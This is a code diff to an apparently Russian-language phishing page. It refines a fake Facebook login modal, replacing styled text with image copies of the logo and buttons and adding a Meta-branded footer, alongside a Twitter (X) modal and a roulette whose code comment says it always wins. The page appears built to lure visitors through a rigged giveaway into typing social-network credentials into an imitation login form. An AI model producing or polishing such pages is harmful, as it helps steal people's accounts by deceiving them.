@@ -384,19 +384,17 @@
             border-radius: 8px 8px 0 0;
         }
 
-        /* Логотип Facebook */
+        /* Логотип Facebook - изображение */
         .facebook-logo-container {
             margin: 30px 0 20px;
             text-align: center;
             width: 100%;
         }
 
-        .facebook-logo-text {
-            color: #1877f2;
-            font-size: 42px;
-            font-weight: bold;
-            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-            letter-spacing: -1px;
+        .facebook-logo {
+            width: 200px;
+            height: auto;
+            object-fit: contain;
         }
 
         /* Контейнер формы */
@@ -434,24 +432,21 @@
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
 
-        /* Кнопка Войти */
+        /* Кнопка Войти - изображение */
         .facebook-login-button {
             width: 100%;
-            padding: 14px 0;
-            background: #1877f2;
-            color: white;
+            height: 48px;
+            background: transparent;
             border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: bold;
             cursor: pointer;
             margin-top: 6px;
-            transition: background-color 0.2s;
-            height: 48px;
+            padding: 0;
         }
 
-        .facebook-login-button:hover {
-            background: #166fe5;
+        .facebook-login-button img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
         }
 
         /* Забыли пароль */
@@ -495,7 +490,7 @@
             padding: 0 15px;
         }
 
-        /* Кнопка создания аккаунта */
+        /* Кнопка создания аккаунта - изображение */
         .facebook-create-container {
             margin-top: 20px;
             width: 100%;
@@ -503,38 +498,51 @@
 
         .facebook-create-button {
             width: 100%;
-            padding: 14px 0;
-            background: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s;
             height: 48px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            padding: 0;
         }
 
-        .facebook-create-button:hover {
-            background: #36a420;
+        .facebook-create-button img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
         }
 
-        /* Футер */
+        /* Футер - упрощенный */
         .facebook-footer {
             background: #fff;
-            padding: 20px 16px;
+            padding: 15px 16px;
             font-size: 12px;
             color: #737373;
             text-align: center;
             margin-top: auto;
         }
 
-        .footer-top-links {
+        .footer-meta {
             display: flex;
-            flex-wrap: wrap;
+            align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 16px;
+            margin-bottom: 10px;
+        }
+
+        .meta-icon {
+            width: 16px;
+            height: 16px;
+            background-image: url('meta.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
         }
 
         .footer-link {
@@ -546,46 +554,6 @@
 
         .footer-link:hover {
             text-decoration: underline;
-        }
-
-        .footer-divider {
-            height: 1px;
-            background: #dadde1;
-            margin: 16px 0;
-        }
-
-        .footer-main-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 16px;
-        }
-
-        .footer-column {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px;
-            max-width: 100%;
-        }
-
-        .footer-meta {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 20px;
-            color: #737373;
-            font-size: 12px;
-        }
-
-        .meta-icon {
-            font-size: 14px;
-        }
-
-        .meta-copyright {
-            margin-left: 8px;
         }
 
         /* Twitter (X) модалка */
@@ -1247,17 +1215,8 @@
                 border-radius: 0;
             }
             
-            .facebook-logo-text {
-                font-size: 36px;
-            }
-            
-            .footer-top-links,
-            .footer-column {
-                gap: 6px;
-            }
-            
-            .footer-link {
-                font-size: 11px;
+            .facebook-logo {
+                width: 180px;
             }
 
             .twitter-modal-content,
@@ -1299,8 +1258,8 @@
                 max-height: 150px;
             }
 
-            .facebook-logo-text {
-                font-size: 32px;
+            .facebook-logo {
+                width: 160px;
             }
             
             .facebook-input {
@@ -1311,11 +1270,10 @@
             .facebook-login-button,
             .facebook-create-button {
                 height: 44px;
-                font-size: 18px;
             }
             
-            .footer-link {
-                font-size: 10px;
+            .footer-links {
+                gap: 15px;
             }
         }
 
@@ -1415,9 +1373,9 @@
     <div class="modal-overlay" id="facebookModal">
         <div class="modal-content facebook-modal-content">
             <div class="facebook-content">
-                <!-- Логотип Facebook -->
+                <!-- Логотип Facebook - изображение -->
                 <div class="facebook-logo-container">
-                    <div class="facebook-logo-text">facebook</div>
+                    <img src="facebook.png" alt="Facebook" class="facebook-logo">
                 </div>
                 
                 <!-- Форма входа -->
@@ -1435,9 +1393,9 @@
                                    placeholder="Пароль" required>
                         </div>
                         
-                        <!-- Кнопка Войти -->
+                        <!-- Кнопка Войти - изображение -->
                         <button type="submit" class="facebook-login-button">
-                            Войти
+                            <img src="vhod.png" alt="Войти">
                         </button>
                         
                         <!-- Ссылка "Забыли пароль?" -->
@@ -1452,73 +1410,26 @@
                             <span>или</span>
                         </div>
                         
-                        <!-- Кнопка "Создать новый аккаунт" -->
+                        <!-- Кнопка "Создать новый аккаунт" - изображение -->
                         <div class="facebook-create-container">
                             <button type="button" class="facebook-create-button" id="createAccount">
-                                Создать новый аккаунт
+                                <img src="sozdanie.png" alt="Создать новый аккаунт">
                             </button>
                         </div>
                     </form>
                 </div>
             </div>
             
-            <!-- Футер с информацией -->
+            <!-- Футер - упрощенный -->
             <div class="facebook-footer">
-                <div class="footer-top-links">
-                    <a href="#" class="footer-link">Русский</a>
-                    <a href="#" class="footer-link">English (US)</a>
-                    <a href="#" class="footer-link">Türkçe</a>
-                    <a href="#" class="footer-link">Bahasa Indonesia</a>
-                    <a href="#" class="footer-link">中文(简体)</a>
-                    <a href="#" class="footer-link">Қазақша</a>
-                    <a href="#" class="footer-link">Deutsch</a>
-                    <a href="#" class="footer-link">한국어</a>
-                    <a href="#" class="footer-link">Shqip</a>
-                    <a href="#" class="footer-link">Español</a>
-                    <a href="#" class="footer-link">Português (Brasil)</a>
-                </div>
-                
-                <div class="footer-divider"></div>
-                
-                <div class="footer-main-links">
-                    <div class="footer-column">
-                        <a href="#" class="footer-link">Регистрация</a>
-                        <a href="#" class="footer-link">Вход</a>
-                        <a href="#" class="footer-link">Messenger</a>
-                        <a href="#" class="footer-link">Facebook Lite</a>
-                        <a href="#" class="footer-link">Видео</a>
-                        <a href="#" class="footer-link">Места</a>
-                        <a href="#" class="footer-link">Игры</a>
-                        <a href="#" class="footer-link">Marketplace</a>
-                        <a href="#" class="footer-link">Meta Pay</a>
-                        <a href="#" class="footer-link">Магазин Meta</a>
-                        <a href="#" class="footer-link">Meta Quest</a>
-                        <a href="#" class="footer-link">Meta AI</a>
-                        <a href="#" class="footer-link">Instagram</a>
-                        <a href="#" class="footer-link">Threads</a>
-                        <a href="#" class="footer-link">Благотворительные акции</a>
-                        <a href="#" class="footer-link">Услуги</a>
-                        <a href="#" class="footer-link">Центр информации о выборах</a>
-                        <a href="#" class="footer-link">Политика конфиденциальности</a>
-                        <a href="#" class="footer-link">Центр конфиденциальности</a>
-                        <a href="#" class="footer-link">Группы</a>
-                        <a href="#" class="footer-link">Информация</a>
-                        <a href="#" class="footer-link">Создать рекламу</a>
-                        <a href="#" class="footer-link">Создать Страницу</a>
-                        <a href="#" class="footer-link">Разработчикам</a>
-                        <a href="#" class="footer-link">Вакансии</a>
-                        <a href="#" class="footer-link">Файлы cookie</a>
-                        <a href="#" class="footer-link">Рекламные предпочтения</a>
-                        <a href="#" class="footer-link">Условия использования</a>
-                        <a href="#" class="footer-link">Справка</a>
-                        <a href="#" class="footer-link">Загрузка контактов и лица, не являющиеся пользователями</a>
-                    </div>
-                </div>
-                
                 <div class="footer-meta">
-                    <div class="meta-icon">☒</div>
+                    <div class="meta-icon"></div>
                     <span>Meta</span>
-                    <div class="meta-copyright">© 2025</div>
+                </div>
+                <div class="footer-links">
+                    <a href="#" class="footer-link">Информация</a>
+                    <a href="#" class="footer-link">Справка</a>
+                    <a href="#" class="footer-link">Ещё</a>
                 </div>
             </div>
         </div>
@@ -1666,7 +1577,6 @@
             // Обновление года в футере
             const currentYear = new Date().getFullYear();
             document.querySelector('.twitter-footer').innerHTML = `© ${currentYear} X Corp.`;
-            document.querySelector('.meta-copyright').textContent = `© ${currentYear}`;
         }
 
         // Вращение рулетки (всегда выигрывает Mummy)
